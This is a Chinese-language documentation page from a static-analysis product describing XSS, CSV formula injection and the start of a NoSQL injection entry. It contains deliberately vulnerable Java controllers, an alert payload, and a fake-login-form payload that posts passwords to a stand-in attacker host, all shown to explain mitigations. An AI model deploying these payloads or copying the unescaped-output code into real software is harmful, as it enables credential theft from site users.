
<!DOCTYPE html>
<html lang="zh">

<head>
    <link href='../../../theme/fonts/googleapis.css' rel='stylesheet' type='text/css'>
    <link href="../../../theme/stylesheet/normalize.min.css">
    <script src="../../../theme/javascript/jquery.min.js"></script>
    <script type="text/javascript" src="../../../tipuesearch_content.js"></script>
    <link rel="stylesheet" href="../../../theme/tipuesearch/css/tipuesearch.css">
    <script type="text/javascript" src="../../../theme/tipuesearch/tipuesearch_set.js"></script>
    <script type="text/javascript" src="../../../theme/tipuesearch/tipuesearch.js"></script>

        <link rel="stylesheet" type="text/css" href="../../../theme/stylesheet/style.css">

    <link rel="stylesheet" type="text/css"
          href="../../../theme/pygments/xcode.min.css">
    <link rel="stylesheet" type="text/css" href="../../../theme/font-awesome/css/font-awesome.min.css">





    <meta charset="utf-8"/>
    <meta http-equiv="X-UA-Compatible" content="IE=edge"/>
    <meta name="HandheldFriendly" content="True"/>
    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>     <meta name="robots" content=""/>      <!-- Chrome, Firefox OS and Opera -->
    <meta name="theme-color" content="#333333">
    <!-- Windows Phone -->
    <meta name="msapplication-navbutton-color" content="#333333">
    <!-- iOS Safari -->
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
    <!-- Microsoft EDGE -->
    <meta name="msapplication-TileColor" content="#333333">      <meta name="author" content="Pinpoint Team"/>
    <meta name="description" content="Manual and documents for Sourcebrella Pinpoint"/> <meta property="og:site_name" content="Pinpoint Document"/>
<meta property="og:type" content="blog"/>
<meta property="og:title" content="Pinpoint Document"/>
<meta property="og:description" content="Manual and documents for Sourcebrella Pinpoint"/>
<meta property="og:locale" content="en_US"/>
<meta property="og:url" content="../../.."/>
 
    <title>Pinpoint Document &ndash; Category</title>

</head>

<body style="display: none;">

<aside>
    <div>
        <a href="../../..">
                <img src="../../../theme/img/profile.png" alt="Pinpoint Document" title="Pinpoint Document">
        </a>
        <h1><a href="../../..">Pinpoint Document</a></h1>

        <div style="padding-left: 0">
            <form action="../../../search.html" onsubmit="return validateForm(this.elements['q'].value);">
                <input id="tipue_search_input" type="text" name="q" placeholder="输入以搜索">
            </form>
        </div>


        <ul class="global_lang">
                    <li><a href="javascript:void(0);"
                                                                                  language-link="en">en</a>
                    </li>
                    <li class="active"><a href="javascript:void(0);"
                                                                                  language-link="zh">zh</a>
                    </li>
        </ul>

        <!--  -->

        <nav>
            <ul class="list">
                    <li>
                        <a href="../../../standard/language-independent.html">Language Independent 缺陷文档</a>
                        (3)
                    </li>
                    <li>
                        <a href="../../../standard/c.html">c/c++ 缺陷文档</a>
                        (316)
                    </li>
                    <li>
                        <a href="../../../standard/csharp.html">csharp 缺陷文档</a>
                        (39)
                    </li>
                    <li>
                        <a href="../../../standard/golang.html">golang 缺陷文档</a>
                        (34)
                    </li>
                    <li>
                        <a href="../../../standard/java.html">java 缺陷文档</a>
                        (555)
                    </li>
                    <li>
                        <a href="../../../standard/javascript.html">javascript 缺陷文档</a>
                        (295)
                    </li>
                    <li>
                        <a href="../../../standard/objective-c.html">objective-c 缺陷文档</a>
                        (124)
                    </li>
                    <li>
                        <a href="../../../standard/php.html">php 缺陷文档</a>
                        (58)
                    </li>
                    <li>
                        <a href="../../../standard/python.html">python 缺陷文档</a>
                        (618)
                    </li>
                    <li>
                        <a href="../../../standard/swift.html">swift 缺陷文档</a>
                        (26)
                    </li>

            </ul>
        </nav>

        <ul class="social">
        </ul>
    </div>


</aside>
<main>
          <article>
            <h1>
            输入验证与表示 (35)
            </h1>
        </article>
        <article class="single">
            <header>
                <div class="breadcrumb">
                <ol>
                    <li>
                        <a href="../../../standard/c.html">c/c++</a>
                    </li>
                    <li>
                            <a href="../../../subcategory/c/security issues.html">安全问题</a>
                    </li>
                    <li>
                            <a href="../../../subcategory/c/security issues/input validation and representation.html">输入验证与表示</a>
                    </li>
                </ol>
                
                </div>

                <h1 id="PE0080">跨站脚本攻击</h1>
                <p>
                    在 2024-九月-28 发布于 <a href="../../../category/input-validation-and-representation.html">输入验证与表示</a> 分类

                    &#8226; 2 min read
                </p>
            </header>

                <div class="toc">
<ul>
<li><a href="#_1">描述</a><ul>
<li><a href="#_2">反射型</a></li>
<li><a href="#_3">持久化</a></li>
<li><a href="#dom">DOM</a></li>
</ul>
</li>
<li><a href="#_4">风险评估</a></li>
<li><a href="#_5">漏洞利用威胁</a></li>
<li><a href="#_6">示例</a><ul>
<li><a href="#1">例子1</a></li>
<li><a href="#2">例子2</a></li>
</ul>
</li>
<li><a href="#_7">潜在的缓解措施</a><ul>
<li><a href="#1_1">框架或者库1</a></li>
<li><a href="#_8">根据上下文转义输出</a></li>
<li><a href="#html">对不可信的HTML输入进行安全验证</a></li>
<li><a href="#1_2">分离数据和代码1</a></li>
<li><a href="#cookiehttponly16">将会话cookie设置为HttpOnly16</a></li>
<li><a href="#2_1">禁止脚本2</a></li>
<li><a href="#cookie2">Cookie保护2</a></li>
<li><a href="#_9">使用静态代码分析器</a></li>
</ul>
</li>
<li><a href="#_10">引用</a></li>
</ul>
</div>

            <div>
                
<h1 id="_1">描述</h1>
<p>在将用户可控输入输出到网页前，软件不会清洗或者正确清洗用户输入，此时可能会触发XSS。XSS主要分为3类: 反射XSS、持久化XSS和基于DOM的XSS。</p>
<h3 id="_2">反射型</h3>
<p>服务器直接从http请求读取数据，并将请求中的数据填入http回包中。对反射型XSS的利用，通常是攻击者引诱受害者提供了危险数据给被攻击的网络应用，该网络应用将危险数据反射给了受害者，并被受害者的浏览器执行。
传递恶意内容的最常见方法是将恶意内容作为参数包含在URL中，通过公开发布或者电子邮件发送给受害者。以这种方式构造的URL是许多网络钓鱼方案的核心，攻击者借此诱使受害者访问指向易受攻击站点的URL。该站点将攻击者的内容反射回受害者后，由受害者的浏览器执行。</p>
<h3 id="_3">持久化</h3>
<p>网络应用在数据库、消息论坛、访问者日志或其他可信数据存储区中存储危险数据。稍后, 危险数据随后被读回网络应用中, 并包含在网页内容中。从攻击者的角度来看，注入有害数据的最佳位置在那些曝光度非常高的网页上。一旦有用户执行了有害数据，攻击者就有可能能够拿到用户的权限，用户的敏感数据也将暴露给攻击者。
例如，攻击者可能将XSS注入日志消息，而当管理员查看日志时，可能无法正确处理。</p>
<h3 id="dom">DOM</h3>
<p>在基于DOM的XSS中，客户端是将XSS注入到页面中的实施者，其他类型的XSS中，服务器是实施者。基于DOM的XSS通常涉及发送给客户端的由服务器控制的可信脚本，例如在用户提交之前对表单执行完整性检查的javascript脚本。如果服务器提供的脚本处理用户提供的数据，然后将其注入到网页中（例如使用动态HTML），则可以使用基于DOM的XSS。</p>
<h1 id="_4">风险评估</h1>
<p>下表指定了单个薄弱环节被攻击后可能造成的后果。</p>
<table>
<thead>
<tr>
<th>范围</th>
<th>影响</th>
<th>可能性</th>
</tr>
</thead>
<tbody>
<tr>
<td>访问控制、保密缺失</td>
<td>使用跨站点脚本执行的最常见攻击涉及暴露存储在用户cookie中的信息。通常，恶意用户制作的客户端脚本被浏览器解析的时候，进行一些操作（比如将所有网站cookie发送到给定的电子邮件地址）。该脚本将被访问该网站的每个用户加载和运行，由于请求运行脚本的站点可以访问所有相关的cookie，所以恶意脚本也可以。</td>
<td></td>
</tr>
<tr>
<td>完整性、保密、可用性缺失</td>
<td>在某些情况下，当跨站点脚本与其他缺陷结合使用时，可能会在受害者的计算机上运行任意代码。</td>
<td></td>
</tr>
<tr>
<td>保密性、完整性、访问控制缺失</td>
<td>无论是持久化还是反射型，XSS攻击的后果都是相同的。不同之处在于有效负载如何到达服务器。XSS可能会给最终用户带来各种问题，严重程度可从轻微的骚扰到整个帐号信息的崩溃。某些跨站点脚本漏洞可用于操纵或窃取cookie，创建可能被误认为有效用户的请求，破坏机密信息或在最终用户系统上执行恶意代码以实现各种恶意目的。其他破坏性攻击包括暴露终端用户文件，安装特洛伊木马程序，将用户重定向到其他页面或站点，在用户认为可靠的站点上运行“Active X”控件（在Microsoft Internet Explorer下），以及修改页面显示。</td>
<td></td>
</tr>
</tbody>
</table>
<h1 id="_5">漏洞利用威胁</h1>
<p>高危</p>
<h1 id="_6">示例</h1>
<h3 id="1">例子1</h3>
<p>这段代码会通过http<code>GET</code>方法，根据url的<code>msg</code>参数来获取一个欢迎页面，展示了反射型XSS。</p>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre> 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="c1">// Copyright (C), 2016-2018, Sourcebrella, Inc Ltd - All rights reserved.</span>
<span class="c1">// Unauthorized copying, using, modifying of this file, via any medium is</span>
<span class="c1">// strictly prohibited.</span>
<span class="c1">// Proprietary and confidential.</span>

<span class="kn">import</span> <span class="nn">org.springframework.web.bind.annotation.RequestMapping</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">org.springframework.web.bind.annotation.RequestParam</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">org.springframework.web.bind.annotation.RestController</span><span class="o">;</span>

<span class="nd">@RestController</span>
<span class="kd">public</span> <span class="kd">class</span> <span class="nc">VunerableController</span> <span class="o">{</span>
  <span class="nd">@RequestMapping</span><span class="o">(</span><span class="s">"/echo"</span><span class="o">)</span>
  <span class="kd">public</span> <span class="n">String</span> <span class="nf">echo</span><span class="o">(</span><span class="nd">@RequestParam</span><span class="o">(</span><span class="n">value</span> <span class="o">=</span> <span class="s">"msg"</span><span class="o">)</span> <span class="n">String</span> <span class="n">msg</span><span class="o">)</span> <span class="o">{</span>
    <span class="k">return</span> <span class="n">msg</span><span class="o">;</span>
  <span class="o">}</span>
<span class="o">}</span>
</pre></div>
</td></tr></table>
<p>因为参数可以是任意的，所以页面的URL可以被修改，让<code>msg</code>包含脚本语法，比如</p>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre>1</pre></div></td><td class="code"><div class="highlight"><pre><span></span>http://trusted.sbrella.in/echo?msg=<span class="p">&lt;</span><span class="nt">script</span> <span class="na">language</span><span class="o">=</span><span class="s">"javascript"</span><span class="p">&gt;</span><span class="nx">alert</span><span class="p">(</span><span class="s2">"You've been attacked!"</span><span class="p">);&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
</pre></div>
</td></tr></table>
<p>这段代码会弹出一个还算无害的对话框。 这似乎不是一个很大的漏洞。 毕竟，为什么有人会输入一个导致恶意代码在自己的计算机上运行的URL？ 真正的危险是攻击者会创建恶意URL，然后使用电子邮件或社会工程技巧诱骗受害者访问URL的链接。 当受害者点击链接时，他们无意中通过易受攻击的Web应用程序将恶意内容反射回自己的计算机。</p>
<p>更贴合实际的是，攻击者可以在页面上嵌入一个虚假的登录框，欺骗用户将用户的密码发送给攻击者。</p>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre>1</pre></div></td><td class="code"><div class="highlight"><pre><span></span>http://trusted.sbrella.in/echo?msg=<span class="p">&lt;</span><span class="nt">div</span> <span class="na">id</span><span class="o">=</span><span class="s">"stealpassword"</span><span class="p">&gt;</span>Please Login:<span class="p">&lt;</span><span class="nt">form</span> <span class="na">name</span><span class="o">=</span><span class="s">"input"</span> <span class="na">action</span><span class="o">=</span><span class="s">"http://attack.sbrella.in/stealpassword"</span> <span class="na">method</span><span class="o">=</span><span class="s">"post"</span><span class="p">&gt;</span>Username: <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">"text"</span> <span class="na">name</span><span class="o">=</span><span class="s">"username"</span> <span class="p">/&gt;&lt;</span><span class="nt">br</span><span class="p">/&gt;</span>Password: <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">"password"</span> <span class="na">name</span><span class="o">=</span><span class="s">"password"</span> <span class="p">/&gt;&lt;</span><span class="nt">br</span><span class="p">/&gt;&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">"submit"</span> <span class="na">value</span><span class="o">=</span><span class="s">"Login"</span> <span class="p">/&gt;&lt;/</span><span class="nt">form</span><span class="p">&gt;&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
</pre></div>
</td></tr></table>
<p>如果用户点击这个链接，<code>echo</code>处理程序将生成以下HTML并将其发送到用户的浏览器</p>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre>1
2
3
4
5
6
7
8</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="p">&lt;</span><span class="nt">div</span> <span class="na">id</span><span class="o">=</span><span class="s">"stealpassword"</span><span class="p">&gt;</span>
  Please Login:
  <span class="p">&lt;</span><span class="nt">form</span> <span class="na">name</span><span class="o">=</span><span class="s">"input"</span> <span class="na">action</span><span class="o">=</span><span class="s">"http://attack.sbrella.in/stealpassword"</span> <span class="na">method</span><span class="o">=</span><span class="s">"post"</span><span class="p">&gt;</span>
    Username:
    <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">"text"</span> <span class="na">name</span><span class="o">=</span><span class="s">"username"</span> <span class="p">/&gt;&lt;</span><span class="nt">br</span><span class="p">/&gt;</span>Password: <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">"password"</span> <span class="na">name</span><span class="o">=</span><span class="s">"password"</span> <span class="p">/&gt;&lt;</span><span class="nt">br</span><span class="p">/&gt;</span>
    <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">"submit"</span> <span class="na">value</span><span class="o">=</span><span class="s">"Login"</span> <span class="p">/&gt;</span>
  <span class="p">&lt;/</span><span class="nt">form</span><span class="p">&gt;</span>
<span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
</pre></div>
</td></tr></table>
<p>如果用户提交此表单，攻击者可以轻松获取用户的密码。</p>
<h3 id="2">例子2</h3>
<p>以下示例由Web应用程序中的两个单独页面组成，一个用于创建用户帐户，另一个用于列出用户。 它展示一个持久化XSS攻击的场景。</p>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre> 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="c1">// Copyright (C), 2016-2018, Sourcebrella, Inc Ltd - All rights reserved.</span>
<span class="c1">// Unauthorized copying, using, modifying of this file, via any medium is</span>
<span class="c1">// strictly prohibited.</span>
<span class="c1">// Proprietary and confidential.</span>

<span class="kn">import</span> <span class="nn">java.util.Collection</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.util.Optional</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.util.logging.Level</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.util.logging.Logger</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">org.springframework.web.bind.annotation.RequestMapping</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">org.springframework.web.bind.annotation.RequestParam</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">org.springframework.web.bind.annotation.RestController</span><span class="o">;</span>

<span class="kd">interface</span> <span class="nc">Row</span> <span class="o">{</span>
  <span class="n">Object</span> <span class="nf">getColumnByName</span><span class="o">(</span><span class="n">String</span> <span class="n">name</span><span class="o">);</span>
<span class="o">}</span>

<span class="kd">interface</span> <span class="nc">QueryResult</span> <span class="o">{</span>
  <span class="n">Row</span> <span class="nf">fetchOne</span><span class="o">();</span>

  <span class="n">Collection</span><span class="o">&lt;</span><span class="n">Row</span><span class="o">&gt;</span> <span class="nf">fetchAll</span><span class="o">();</span>
<span class="o">}</span>

<span class="kd">interface</span> <span class="nc">SQLConnection</span> <span class="o">{</span>
  <span class="n">QueryResult</span> <span class="nf">execute</span><span class="o">(</span><span class="n">String</span> <span class="n">query</span><span class="o">);</span>
  <span class="n">Optional</span><span class="o">&lt;</span><span class="n">String</span><span class="o">&gt;</span> <span class="nf">sanitize</span><span class="o">(</span><span class="n">String</span> <span class="n">query</span><span class="o">);</span>
<span class="o">}</span>

<span class="nd">@RestController</span>
<span class="kd">public</span> <span class="kd">class</span> <span class="nc">DemoController</span> <span class="o">{</span>
  <span class="kd">private</span> <span class="kd">static</span> <span class="kd">final</span> <span class="n">Logger</span> <span class="n">logger</span> <span class="o">=</span> 
                       <span class="n">Logger</span><span class="o">.</span><span class="na">getLogger</span><span class="o">(</span><span class="n">DemoController</span><span class="o">.</span><span class="na">class</span><span class="o">.</span><span class="na">getName</span><span class="o">());</span>
  <span class="kd">private</span> <span class="kd">final</span> <span class="n">SQLConnection</span> <span class="n">connection</span><span class="o">;</span>

  <span class="kd">public</span> <span class="nf">DemoController</span><span class="o">(</span><span class="n">SQLConnection</span> <span class="n">connection</span><span class="o">)</span> <span class="o">{</span>
    <span class="k">this</span><span class="o">.</span><span class="na">connection</span> <span class="o">=</span> <span class="n">connection</span><span class="o">;</span>
  <span class="o">}</span>

  <span class="nd">@RequestMapping</span><span class="o">(</span><span class="n">value</span> <span class="o">=</span> <span class="s">"/createuser"</span><span class="o">)</span>
  <span class="kd">public</span> <span class="kt">void</span> <span class="nf">createUser</span><span class="o">(</span><span class="nd">@RequestParam</span><span class="o">(</span><span class="n">value</span> <span class="o">=</span> <span class="s">"username"</span><span class="o">)</span> <span class="n">String</span> <span class="n">username</span><span class="o">)</span> <span class="o">{</span>
    <span class="n">Optional</span><span class="o">&lt;</span><span class="n">String</span><span class="o">&gt;</span> <span class="n">s</span> <span class="o">=</span>
        <span class="n">connection</span><span class="o">.</span><span class="na">sanitize</span><span class="o">(</span>
            <span class="n">String</span><span class="o">.</span><span class="na">format</span><span class="o">(</span><span class="s">"insert into users (username) values (\"%s\")"</span><span class="o">,</span> <span class="n">username</span><span class="o">));</span>
    <span class="k">if</span> <span class="o">(!</span><span class="n">s</span><span class="o">.</span><span class="na">isPresent</span><span class="o">())</span> <span class="o">{</span>
      <span class="k">return</span><span class="o">;</span>
    <span class="o">}</span>
    <span class="n">connection</span><span class="o">.</span><span class="na">execute</span><span class="o">(</span><span class="n">s</span><span class="o">.</span><span class="na">get</span><span class="o">());</span>
    <span class="k">return</span><span class="o">;</span>
  <span class="o">}</span>

  <span class="nd">@RequestMapping</span><span class="o">(</span><span class="n">value</span> <span class="o">=</span> <span class="s">"/listusers"</span><span class="o">)</span>
  <span class="kd">public</span> <span class="n">String</span> <span class="nf">listUsers</span><span class="o">()</span> <span class="o">{</span>
    <span class="n">QueryResult</span> <span class="n">result</span> <span class="o">=</span> <span class="n">connection</span><span class="o">.</span><span class="na">execute</span><span class="o">(</span><span class="s">"select * from users"</span><span class="o">);</span>
    <span class="n">String</span> <span class="n">content</span> <span class="o">=</span> <span class="s">"&lt;div id=userlist&gt;Users:"</span><span class="o">;</span>
    <span class="k">for</span> <span class="o">(</span><span class="n">Row</span> <span class="n">row</span> <span class="o">:</span> <span class="n">result</span><span class="o">.</span><span class="na">fetchAll</span><span class="o">())</span> <span class="o">{</span>
      <span class="n">String</span> <span class="n">username</span> <span class="o">=</span> <span class="o">(</span><span class="n">String</span><span class="o">)</span> <span class="n">row</span><span class="o">.</span><span class="na">getColumnByName</span><span class="o">(</span><span class="s">"username"</span><span class="o">);</span>
      <span class="n">content</span> <span class="o">+=</span> <span class="s">"&lt;div class=\"username\"&gt;"</span> <span class="o">+</span> <span class="n">username</span> <span class="o">+</span> <span class="s">"&lt;/div&gt;"</span><span class="o">;</span>
    <span class="o">}</span>
    <span class="n">content</span> <span class="o">+=</span> <span class="s">"&lt;/div&gt;"</span><span class="o">;</span>
    <span class="k">return</span> <span class="n">content</span><span class="o">;</span>
  <span class="o">}</span>
<span class="o">}</span>
</pre></div>
</td></tr></table>
<p>攻击者可以将其用户名设置为任意HTML，然后将显示给用户页面的所有访问者。</p>
<h1 id="_7">潜在的缓解措施</h1>
<h3 id="1_1">框架或者库<sup id="fnref-cwe"><a class="footnote-ref" href="#fn-cwe">1</a></sup></h3>
<p>使用经过审查的库或框架，例如<a href="https://www.microsoft.com/en-us/download/details.aspx?id=43126">Microsoft's Anti-XSS library</a>，<a href="https://www.javadoc.io/doc/org.owasp.esapi/esapi/2.1.0.1">OWASP ESAPI</a>，和<a href="https://wicket.apache.org/">Apache Wicket</a>.</p>
<h3 id="_8">根据上下文转义输出</h3>
<p>根据上下文转义输出可以作为防范XSS攻击的主要措施。根据不受信任的字符串需要放置在HTML文档中的位置，可以使用多种转义方案，包括HTML实体编码，JavaScript转义，CSS转义和URL转义。大多数不需要接受大量数据的Web应用程序都可以使用转义来直接消除大部分XSS攻击的风险。广泛被采用的只对XML中5个显著特征进行html实体编码的方法并不总是能防范很多XSS攻击。</p>
<h3 id="html">对不可信的HTML输入进行安全验证</h3>
<p>很多网站的管理员允许用户在输入中填入html代码。当接受来自用户的html输入（比如<code>&lt;b&gt;very&lt;/b&gt; large</code>），对输出进行编码（比如<code>&amp;lt;b&amp;gt;very&amp;lt;/b&amp;gt; large</code>）还不足以防范XSS攻击，因为用户输入还需要被浏览器渲染为html页面（上下文的例子中，页面会显示<code>very large</code>，而不是<code>&lt;b&gt;very&lt;/b&gt; large</code>）。防范这种来自用户输入的html的XSS攻击相较更加复杂。不可信的HTML输入必须通过HTML清洗引擎处理，以确保它不包含XSS代码。还应该注意的是，许多验证依赖于解析特定的“有风险”的html标签，如以下</p>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre>1</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span><span class="err"> &lt;link&gt; &lt;iframe&gt;</span>
</pre></div>
</td></tr></table>
<p>这种方法有几个问题，例如有时看起来无害的标签被忽略，当正确使用时仍然可以导致XSS。例如</p>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre>1</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="p">&lt;</span><span class="nt">img</span> <span class="na">src</span><span class="o">=</span><span class="s">"javascript:alert(1)"</span><span class="p">&gt;</span>
</pre></div>
</td></tr></table>
<p>另一个流行的方法是剥离用户输入的<code>"</code>和<code>'</code>，但这也可以被绕过，因为载荷数据可以通过混淆来隐藏。</p>
<h3 id="1_2">分离数据和代码<sup id="fnref2-cwe"><a class="footnote-ref" href="#fn-cwe">1</a></sup></h3>
<p>如果条件允许的话，可以使用有层次的机制自动化地强制分离数据和代码。这些机制能提供自动化的转义，编码和验证，而不是依赖开发者在每个输出点手动转义，编码和验证。</p>
<h3 id="cookiehttponly16">将会话cookie设置为HttpOnly<sup id="fnref3-cwe"><a class="footnote-ref" href="#fn-cwe">1</a></sup><sup id="fnref-http-only"><a class="footnote-ref" href="#fn-http-only">6</a></sup></h3>
<p>为了帮助减轻针对用户会话cookie的XSS攻击，可以将会话cookie设置为HttpOnly。在支持HttpOnly功能的浏览器（例如更新版本的Internet Explorer和Firefox）中，该属性可以防止用户的会话cookie被使用<code>document.cookie</code>的恶意客户端脚本访问。但这不是一个完整的解决方案，因为并不是所有浏览器都支持HttpOnly。</p>
<h3 id="2_1">禁止脚本<sup id="fnref-wikipedia"><a class="footnote-ref" href="#fn-wikipedia">2</a></sup></h3>
<p>尽管现代Web开发对javascript的依赖非常重度，还是有一些Web应用程序是可以在不需要javascript脚本的状态下运行的。这种情况下，用户可以选择在使用Web应用程序之前在其浏览器中禁用脚本。通过这种方式，即使潜在恶意的客户端脚本也可以在页面上插入有害代码，用户也可以不受XSS影响。</p>
<h3 id="cookie2">Cookie保护<sup id="fnref2-wikipedia"><a class="footnote-ref" href="#fn-wikipedia">2</a></sup></h3>
<p>除了内容过滤之外，还常用其他不完美的跨站脚本缓解方法。一个例子是在处理基于cookie的用户认证时使用额外的安全控制。许多Web应用程序依赖于会话cookie在各个HTTP请求之间进行身份验证，并且因为客户端脚本通常可以访问这些cookie，所以简单的XSS漏洞可以窃取这些cookie。为了缓解这种特殊威胁（尽管通常不是XSS问题），许多Web应用程序将会话cookie与最初登录的用户的IP地址绑定，然后只允许该IP使用该cookie。这在大多数情况下是有效的，除非攻击者与受害者位于同一个NAT地址或Web代理之后或受害者正在更改他动态IP。</p>
<h3 id="_9">使用静态代码分析器</h3>
<p>例如<a href="https://www.sourcebrella.com/">Sourcebrella Pinpoint</a></p>
<h1 id="_10">引用</h1>
<div class="footnote">
<hr/>
<ol>
<li id="fn-cwe">
<p>https://cwe.mitre.org/data/definitions/79.html <a class="footnote-backref" href="#fnref-cwe" title="Jump back to footnote 1 in the text">↩</a><a class="footnote-backref" href="#fnref2-cwe" title="Jump back to footnote 1 in the text">↩</a><a class="footnote-backref" href="#fnref3-cwe" title="Jump back to footnote 1 in the text">↩</a></p>
</li>
<li id="fn-wikipedia">
<p>https://en.wikipedia.org/wiki/Cross-site_scripting <a class="footnote-backref" href="#fnref-wikipedia" title="Jump back to footnote 2 in the text">↩</a><a class="footnote-backref" href="#fnref2-wikipedia" title="Jump back to footnote 2 in the text">↩</a></p>
</li>
<li id="fn-htbridge">
<p>https://www.htbridge.com/vulnerability/cross-site-scripting.html <a class="footnote-backref" href="#fnref-htbridge" title="Jump back to footnote 3 in the text">↩</a></p>
</li>
<li id="fn-white-hat-web">
<p>https://www.amazon.cn/dp/B00LADBDG6/ref=sr_1_1?ie=UTF8&amp;qid=1525694060&amp;sr=8-1&amp;keywords=%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E5%AE%89%E5%85%A8 <a class="footnote-backref" href="#fnref-white-hat-web" title="Jump back to footnote 4 in the text">↩</a></p>
</li>
<li id="fn-owasp">
<p>https://www.owasp.org/index.php/Cross-site_Scripting_(XSS) <a class="footnote-backref" href="#fnref-owasp" title="Jump back to footnote 5 in the text">↩</a></p>
</li>
<li id="fn-http-only">
<p>https://www.owasp.org/index.php/HttpOnly#What_is_HttpOnly.3F <a class="footnote-backref" href="#fnref-http-only" title="Jump back to footnote 6 in the text">↩</a></p>
</li>
</ol>
</div>
            </div>
            <div class="tag-cloud">
                <p>
                <a href="../../../tag/web.html">Web</a>
                <a href="../../../tag/java.html">Java</a>
                <a href="../../../tag/injection.html">Injection</a>
                <a href="../../../tag/cwe-79.html">CWE-79</a>
                <a href="../../../tag/find-sec-bugs.html">FIND-SEC-BUGS</a>
                </p>
            </div>
        </article>

        <article class="single">
            <header>
                <div class="breadcrumb">
                <ol>
                    <li>
                        <a href="../../../standard/c.html">c/c++</a>
                    </li>
                    <li>
                            <a href="../../../subcategory/c/security issues.html">安全问题</a>
                    </li>
                    <li>
                            <a href="../../../subcategory/c/security issues/input validation and representation.html">输入验证与表示</a>
                    </li>
                </ol>
                
                </div>

                <h1 id="PE1085">公式注入</h1>
                <p>
                    在 2024-九月-28 发布于 <a href="../../../category/input-validation-and-representation.html">输入验证与表示</a> 分类

                    &#8226; 1 min read
                </p>
            </header>

                <div class="toc">
<ul>
<li><a href="#_1">缺陷描述</a></li>
<li><a href="#_2">漏洞与风险</a></li>
<li><a href="#_3">漏洞利用威胁</a></li>
<li><a href="#_4">缓解与预防</a></li>
<li><a href="#_5">参考资料</a></li>
</ul>
</div>

            <div>
                
<h1 id="_1">缺陷描述</h1>
<p>当网站在CSV文件中嵌入了不受信的输入时，有可能发生公式注入（也叫CSV注入）。</p>
<h1 id="_2">漏洞与风险</h1>
<p>当使用像<code>Microsoft Excel</code>或<code>LibreOffice Calc</code>这样的软件来打开一个CSV文件时，CSV中所有以<code>'='</code>开头的单元格都会被解释为公式。恶意构造的公式可以用作以下三种攻击：
- 通过利用制表软件的漏洞，攻击者可以劫持用户的电脑，可见CVE-2014-3524。
- 通过利用用户不会在意自己网站上下载的表格文件这一惯性思维来劫持用户的电脑。
- 从当前或别的打开的表格文件中窃取数据。</p>
<h1 id="_3">漏洞利用威胁</h1>
<p>中</p>
<h1 id="_4">缓解与预防</h1>
<p>这种攻击难以防范，为了防御这样的攻击，请确保没有单元格会以以下字符起首：
- 等号'='
- 加号 '+'
- 减号 '-'
- 地址符 '@'</p>
<h1 id="_5">参考资料</h1>
<div class="footnote">
<hr/>
<ol>
<li id="fn-owasp">
<p>https://www.owasp.org/index.php/CSV_Injection <a class="footnote-backref" href="#fnref-owasp" title="Jump back to footnote 1 in the text">↩</a></p>
</li>
</ol>
</div>
            </div>
            <div class="tag-cloud">
                <p>
                <a href="../../../tag/java.html">JAVA</a>
                </p>
            </div>
        </article>

        <article class="single">
            <header>
                <div class="breadcrumb">
                <ol>
                    <li>
                        <a href="../../../standard/c.html">c/c++</a>
                    </li>
                    <li>
                            <a href="../../../subcategory/c/security issues.html">安全问题</a>
                    </li>
                    <li>
                            <a href="../../../subcategory/c/security issues/input validation and representation.html">输入验证与表示</a>
                    </li>
                </ol>
                
                </div>

                <h1 id="PE1086">NoSQL注入</h1>
                <p>
                    在 2024-九月-28 发布于 <a href="../../../category/input-validation-and-representation.html">输入验证与表示</a> 分类

                    &#8226; 1 min read
                </p>
            </header>

                <div class="toc">
<ul>
<li><a href="#_1">缺陷描述</a></li>
<li><a href="#_2">漏洞与风险</a></li>
<li><a href="#_3">漏洞利用威胁</a></li>
<li><a href="#_4">缓解与预防</a></li>
<li><a href="#_5">演示实例</a><ul>
<li><a href="#_6">漏洞代码示例</a></li>
</ul>
</li>
<li><a href="#_7">参考资料</a></li>
</ul>
</div>

            <div>
                
<h1 id="_1">缺陷描述</h1>
